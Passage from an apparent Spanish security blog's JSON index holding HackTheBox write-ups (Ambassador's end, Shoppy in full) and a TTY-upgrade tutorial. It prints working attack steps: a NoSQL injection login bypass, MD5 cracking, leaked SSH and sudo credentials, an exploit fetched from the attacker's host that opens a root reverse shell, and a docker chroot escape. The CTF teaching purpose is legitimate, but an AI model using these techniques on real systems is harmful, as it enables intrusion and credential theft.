8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:47:01 2022 +0000    created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:44:11 2022 +0000    .gitignoredeveloper@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit.developer@ambassador:/opt/my-app$ git showcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDdeveloper@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.Escalada de privilegiosUsando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub**, nos montamos un servidor **HTTP con Pythonpython -m http.server 80En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.developer@ambassador:~$ wget http://10.10.14.61/exploit.py--2023-01-21 05:40:22--  http://10.10.14.61/exploit.pyConnecting to 10.10.14.61:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1409 (1.4K) [text/x-python]Saving to: ‘exploit.py.1’exploit.py.1                                  100%[=================================================================================================&gt;]   1.38K  --.-KB/s    in 0s      2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente.Nota: Recuerda cambiar tu IP de HTBEn nuestra máquina host nos ponemos en escuchadeveloper@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 ❯ nc -nlvp 123listening on [any] 123 ...Al ejecutarlo nos debe llegar la shell como root❯ nc -nlvp 123listening on [any] 123 ...connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732bash: cannot set terminal process group (3731): Inappropriate ioctl for devicebash: no job control in this shellroot@ambassador:/# Ahora podemos vizualizar la flag como rootroot@ambassador:~# lscleanup.sh  root.txt  snaproot@ambassador:~# cat root.txt 5a4**************************4b1root@ambassador:~# "
  },
  
  {
    "title": "Shoppy WriteUp",
    "url": "/posts/shoppy-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, no sql, docker, easy, virtual hosting",
    "date": "2023-01-13 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker.Escaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04Initiating SYN Stealth Scan at 11:59Scanning 10.10.11.180 [65535 ports]Discovered open port 80/tcp on 10.10.11.180Discovered open port 22/tcp on 10.10.11.180Discovered open port 9093/tcp on 10.10.11.180Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)Nmap scan report for 10.10.11.180Host is up, received user-set (0.16s latency).Scanned at 2023-01-15 11:59:53 -04 for 16sNot shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 639093/tcp open  copycat syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.33 seconds           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.180       shoppy.htb\" | tee -a /etc/hostsAhora debemos ver una web con una cuenta regresiva, nada importanteEnumeraciónEnumerando directorios con WFUZZ nos encontramos lo siguiente.Nota: Debes tener clonado el repositorio de SecList❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000053:   200        25 L     62 W       1074 Ch     \"login\"                                                                                                                000000016:   301        10 L     16 W       179 Ch      \"images\"                                                                                                               000000291:   301        10 L     16 W       179 Ch      \"assets\"                                                                                                               000000259:   302        0 L      4 W        28 Ch       \"admin\"   Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque.Login ShoppyIntroducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.Login ShoppyPodemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.''-- -' or '1'='1' or '1'='1'-- -Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y  este otro blog No SQl injection.Podemos probar admin'||'1==1 y poner cualquier contraseña:Bypass LoginBingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con johnecho \"admin:23c6877d9e2b564ef8b32c3a23de27b2\" &gt; hashesecho \"josh:6ebcea65320589ca4f2f1ce039975995\" &gt;&gt; hashes❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=8Press 'q' or Ctrl-C to abort, almost any other key for statusremembermethisway (josh)1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completedTenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://shoppy.htb/[+] Method:       GET[+] Threads:      200[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode===============================================================Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]Progress: 52985 / 100001 (52.98%)    Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts.Al entrar en el web nos encontramos con estoLogin MattermostViendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos.Information leaked❯ ssh jaeger@10.10.11.180jaeger@10.10.11.180's password: Sh0ppyBest@pp!Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26manpath: can't set the locale; make sure $LC_* and $LANG are correctjaeger@shoppy:~$ export TERM=xtermjaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable.Enumeración del sistemajaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Sh0ppyBest@pp!Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerjaeger@shoppy:~$ Intentamos ejecutar el comandojaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*Welcome to Josh password manager!Please enter your master password: PasswordAccess denied! This incident will be reported !jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deployPassword-Managerjaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!jaeger@shoppy:~$ Podemos migrar al usuario Deploy .jaeger@shoppy:~$ su deployPassword: Deploying@pp!$ bashdeploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:/home/jaeger$ Escalada de privilegiosPertenecemos al grupo docker  mirando GtfObins podemos ver que podemos abusar del grupo dockerEjecutamos el comando nos da una shell como root. deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bashroot@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67root@3ea87a82734f:~# "
  },
  
  {
    "title": "Tratamiento de la TTY",
    "url": "/posts/tty/",
    "categories": "pentesting, machine",
    "tags": "tty",
    "date": "2022-02-03 17:00:00 +0100",
    





    "snippet": "Una vez que ganamos acceso a un servidor por medio de una reverse shell no será interactiva al 100%, para solucionar estó debemos aplicar un tratamiento a la TTY, al aplicar este tratamiento podemos hacer Ctrl + C sin miedo a perder la Shell y tambien limpiar la pantalla y tabular para el autocompletado.Tratamientoroot@f5fd61010b2d:~$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullroot@f5fd61010b2d:~$ Presionamos Ctrl + Z para suspender la shellroot@f5fd61010b2d:~$ ^Zzsh: suspended  nc -lvnp 444Reiniciamos la shell y configuramos el tipo de terminal❯ stty raw -echo; fg❯ stty raw -echo; fg[1]  + continued  nc -lvnp 444                              reset xtermYa podemos aplicar Ctrl + C y no perderemos la conexión, pero el Ctrl + L no funciona, para ello cambiamos la variable de entorno TERM a xtermroot@f5fd61010b2d:~$ export TERM=xtermA veces la variable SHELL vale nologin, hacemos lo siguiente para que sea una shellroot@f5fd61010b2d:~$ export SHELL=/bin/bashYa tenemos una consola semi-interactiva, para que sea full-interactiva debemos cambiar las filas y columnas, en la mæquina victima hacemos un:root@f5fd61010b2d:~$ stty size24 80root@f5fd61010b2d:~$ Y en nuestra máquina hacemos lo mismo y confirmamos que los valores no coinciden.❯ stty size48 184Regresamos a la máquina victima y cambiamos los valoresroot@f5fd61010b2d:~$ stty rows 48 columns 184        root@f5fd61010b2d:~$ Una vez hecho esto nuestra TTY ya sera 100% interactiva."
  }
  
]

